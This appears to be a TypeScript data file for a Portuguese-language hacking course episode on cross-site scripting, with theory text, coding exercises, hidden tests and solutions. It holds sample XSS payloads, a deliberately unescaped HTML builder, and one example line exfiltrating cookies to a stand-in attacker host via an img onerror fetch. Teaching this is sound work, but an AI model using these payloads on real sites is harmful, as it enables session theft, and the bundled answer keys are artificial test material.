import type { Challenge, CodeChallenge, TheoryChallenge } from '@/types/challenge';

const theory4_0: TheoryChallenge = {
  id: '4.0',
  type: 'theory',
  episode: 4,
  room: '4.0',
  title: 'Episódio 4 — XSS (Cross-Site Scripting)',
  description: 'Uma das vulnerabilidades mais comuns da web. Sites que não protegem inputs podem ser explorados.',
  content: `
**O que é XSS?**
XSS acontece quando um site aceita código malicioso de um usuário e executa no navegador de outras pessoas.

**Exemplo simples:**
Um fórum permite comentários. Você escreve:
\`<script>alert('Hackeado!')</script>\`

Se o site não proteger, TODOS que virem seu comentário vão ver o alert!

**Por que é perigoso?**
• Roubar cookies (sessões de login)
• Redirecionar para sites falsos
• Roubar senhas digitadas
• Modificar a página

**No mundo real:**
Facebook, Twitter, YouTube já tiveram vulnerabilidades XSS.

Vamos aprender a identificar e explorar (eticamente)!
  `,
};

const code4_1: CodeChallenge = {
  id: '4.1',
  type: 'code',
  episode: 4,
  room: '4.1',
  title: 'Simulando um site vulnerável',
  description: 'Este código simula um site que aceita comentários SEM proteção: qualquer coisa que o usuário mandar vai parar direto no HTML da página, sem checagem nenhuma.',
  instructions: 'Complete gerarHtml(comentario): monte "<div>" + comentario + "</div>" e devolva com return.',
  languages: ['javascript', 'python'],
  starterCode: {
    javascript: `function gerarHtml(comentario) {
  // Monte "<div>" + comentario + "</div>" e devolva com return
}
`,
    python: `def gerar_html(comentario):
    # Monte "<div>" + comentario + "</div>" e devolva com return
    pass
`,
  },
  tests: {
    fn: { javascript: 'gerarHtml', python: 'gerar_html' },
    cases: [
      { name: 'comentário normal', args: ['Ótimo artigo!'], expected: '<div>Ótimo artigo!</div>' },
      { name: 'outro comentário', args: ['Legal'], expected: '<div>Legal</div>' },
      { name: 'comentário vazio', args: [''], expected: '<div></div>', hidden: true },
      { name: 'comentário com script (sem proteção nenhuma)', args: ["<script>alert('XSS')</script>"], expected: "<div><script>alert('XSS')</script></div>", hidden: true },
    ],
  },
  solution: {
    javascript: `function gerarHtml(comentario) {
  return "<div>" + comentario + "</div>";
}`,
    python: `def gerar_html(comentario):
    return "<div>" + comentario + "</div>"`,
  },
  explanation: `
**O que aconteceu:**
O site pegou o comentário e colocou direto no HTML, sem checar nada. Comentário normal = sem problema visível. Mas repare no último teste oculto: uma tag \`<script>\` inteira passou direto, sem ser barrada. Se isso fosse HTML de verdade renderizado num navegador, o script executaria.

Mas e se o comentário for código JavaScript de propósito? 🤔
  `,
  hints: [
    'JavaScript: return "<div>" + comentario + "</div>";',
    'Python: return "<div>" + comentario + "</div>"',
    'Comentário vazio ainda deve gerar "<div></div>" — a função não julga o conteúdo',
  ],
  difficulty: 'easy',
};

const code4_2: CodeChallenge = {
  id: '4.2',
  type: 'code',
  episode: 4,
  room: '4.2',
  title: 'Detectando um ataque XSS',
  description: 'Antes de proteger um site, é preciso conseguir DETECTAR um payload malicioso num comentário. Escreva um detector simples de tags <script>.',
  instructions: 'Complete contemScriptMalicioso(comentario): devolva true se o comentário contiver "<script" (não importa maiúscula/minúscula), senão false.',
  languages: ['javascript', 'python'],
  starterCode: {
    javascript: `function contemScriptMalicioso(comentario) {
  // Transforme o comentário em minúsculas e verifique se contém "<script"
  // Use .toLowerCase() e .includes()
}
`,
    python: `def contem_script_malicioso(comentario):
    # Transforme o comentário em minúsculas e verifique se contém "<script"
    # Use .lower() e o operador "in"
    pass
`,
  },
  tests: {
    fn: { javascript: 'contemScriptMalicioso', python: 'contem_script_malicioso' },
    cases: [
      { name: 'comentário normal', args: ['Ótimo artigo!'], expected: false },
      { name: 'com <script> minúsculo', args: ['<script>alert("XSS")</script>'], expected: true },
      { name: 'comentário vazio', args: [''], expected: false, hidden: true },
      { name: 'com <SCRIPT> maiúsculo (tentativa de burlar o filtro)', args: ['<SCRIPT>alert(1)</SCRIPT>'], expected: true, hidden: true },
    ],
  },
  solution: {
    javascript: `function contemScriptMalicioso(comentario) {
  return comentario.toLowerCase().includes("<script");
}`,
    python: `def contem_script_malicioso(comentario):
    return "<script" in comentario.lower()`,
  },
  explanation: `
**VULNERABILIDADE DETECTADA!**

Um filtro ingênuo que só procurasse por \`<script\` (minúsculo) seria enganado por \`<SCRIPT>\` ou \`<ScRiPt>\` — atacantes exploram exatamente esse tipo de descuido para burlar proteções. Por isso a função converte tudo para minúsculas ANTES de comparar.

**Impacto real de um XSS que passa despercebido:**
• Roubar cookies com \`document.cookie\`
• Redirecionar com \`window.location\`
• Capturar tudo que o usuário digita

**Como proteger de verdade:**
Escapar caracteres especiais (<, >, &, ", '), usar bibliotecas de sanitização, e ter uma Content Security Policy (CSP) — um detector de string, como o que você escreveu, é só a primeira camada.
  `,
  hints: [
    'JavaScript: comentario.toLowerCase().includes("<script")',
    'Python: "<script" in comentario.lower()',
    'Sem converter para minúsculas, "<SCRIPT>" passaria batido pelo filtro',
  ],
  difficulty: 'medium',
};

const theory4_3: TheoryChallenge = {
  id: '4.3',
  type: 'theory',
  episode: 4,
  room: '4.3',
  title: 'Tipos de XSS',
  description: 'XSS tem 3 tipos principais. Vamos entender cada um.',
  content: `
**1. Reflected XSS (Refletido):**
O código malicioso vem na URL.
Exemplo: \`site.com/busca?q=<script>...</script>\`
Vítima clica no link → código executa

**2. Stored XSS (Armazenado):**
O código é guardado no banco de dados.
Exemplo: comentário com XSS
TODAS as pessoas que virem o comentário são afetadas

**3. DOM-based XSS:**
JavaScript da própria página modifica o DOM de forma insegura.
Mais técnico - exploração avançada.

**Qual é pior?**
Stored XSS = mais perigoso (afeta muitas pessoas)
Reflected XSS = atinge uma pessoa por vez

**Próxima sala:** Você vai criar um payload XSS mais realista.
  `,
};

const code4_4: CodeChallenge = {
  id: '4.4',
  type: 'code',
  episode: 4,
  room: '4.4',
  title: 'Simulando o roubo de um cookie',
  description: 'Além de <script>, atacantes usam a tag <img> com o evento onerror: a imagem falha de propósito, e o código do onerror executa. Junte isso com o detector da sala anterior num ataque completo, simulado.',
  instructions: 'Complete simularAtaqueXSS(comentario, cookieSimulado): se o comentário contiver "onerror" (não importa maiúscula/minúscula), devolva "Cookie roubado: " + cookieSimulado. Senão, devolva "Comentário seguro, nenhum cookie roubado."',
  languages: ['javascript', 'python'],
  starterCode: {
    javascript: `function simularAtaqueXSS(comentario, cookieSimulado) {
  // Se comentario (em minúsculas) contiver "onerror":
  //   devolva "Cookie roubado: " + cookieSimulado
  // Senão:
  //   devolva "Comentário seguro, nenhum cookie roubado."
}
`,
    python: `def simular_ataque_xss(comentario, cookie_simulado):
    # Se comentario (em minúsculas) contiver "onerror":
    #   devolva "Cookie roubado: " + cookie_simulado
    # Senão:
    #   devolva "Comentário seguro, nenhum cookie roubado."
    pass
`,
  },
  tests: {
    fn: { javascript: 'simularAtaqueXSS', python: 'simular_ataque_xss' },
    cases: [
      { name: 'comentário seguro', args: ['Ótimo artigo!', 'sessionId=abc123xyz'], expected: 'Comentário seguro, nenhum cookie roubado.' },
      { name: 'payload <img onerror>', args: ["<img src='x' onerror='roubarCookie()'>", 'sessionId=abc123xyz'], expected: 'Cookie roubado: sessionId=abc123xyz' },
      { name: 'payload em maiúsculas', args: ['<IMG SRC=x ONERROR=alert(1)>', 'sessionId=xyz'], expected: 'Cookie roubado: sessionId=xyz', hidden: true },
      { name: 'comentário vazio', args: ['', 'sessionId=abc'], expected: 'Comentário seguro, nenhum cookie roubado.', hidden: true },
    ],
  },
  solution: {
    javascript: `function simularAtaqueXSS(comentario, cookieSimulado) {
  if (comentario.toLowerCase().includes("onerror")) {
    return "Cookie roubado: " + cookieSimulado;
  }
  return "Comentário seguro, nenhum cookie roubado.";
}`,
    python: `def simular_ataque_xss(comentario, cookie_simulado):
    if "onerror" in comentario.lower():
        return "Cookie roubado: " + cookie_simulado
    return "Comentário seguro, nenhum cookie roubado."`,
  },
  explanation: `
**O que você simulou:**
Um payload como \`<img src='x' onerror='...'>\` força o navegador a tentar carregar uma imagem que não existe — e executa o código do \`onerror\` quando isso falha. É uma forma clássica de contornar filtros que só bloqueiam \`<script>\`.

**No mundo real:**
O cookie seria enviado para um servidor do atacante:
\`<img src=x onerror='fetch("http://atacante.com?c=" + document.cookie)'>\`

**Defesa de verdade:**
• Cookies HttpOnly (JavaScript não consegue ler)
• Secure flag (só trafega em HTTPS)
• Atributo SameSite
• Sanitizar TODA tag HTML recebida de um usuário, não só \`<script>\`

**Carreira:**
Bug bounty hunters ganham recompensas reais encontrando XSS em sites famosos — e essa é exatamente a lógica que eles automatizam.
  `,
  hints: [
    'Reaproveite a ideia do detector da sala anterior, mas procurando "onerror" em vez de "<script"',
    'comentario.toLowerCase().includes("onerror") (Python: "onerror" in comentario.lower())',
    'Comentário vazio nunca contém "onerror" — deve cair no caso seguro',
  ],
  difficulty: 'medium',
};

const theory4_5: TheoryChallenge = {
  id: '4.5',
  type: 'theory',
  episode: 4,
  room: '4.5',
  title: 'Episódio 4 completo!',
  description: 'Você agora entende uma das vulnerabilidades web mais exploradas.',
  content: `
**Conhecimentos adquiridos:**
✅ XSS (Cross-Site Scripting)
✅ Reflected vs Stored XSS
✅ Payloads e exploração
✅ Como sites devem se proteger

**Aplicações profissionais:**
• **Bug Bounty Hunter:** Encontra XSS, ganha recompensas
• **Pentester Web:** Testa aplicações web
• **Security Developer:** Implementa proteções

**Ferramentas profissionais:**
• Burp Suite (intercepta e modifica requisições)
• XSS Hunter (detecta blind XSS)
• OWASP ZAP (scanner automático)

**Próximo episódio:**
SQL Injection - ainda mais perigoso que XSS!

Continue evoluindo! 💉
  `,
};

export const episode4Challenges: Challenge[] = [
  theory4_0,
  code4_1,
  code4_2,
  theory4_3,
  code4_4,
  theory4_5,
];
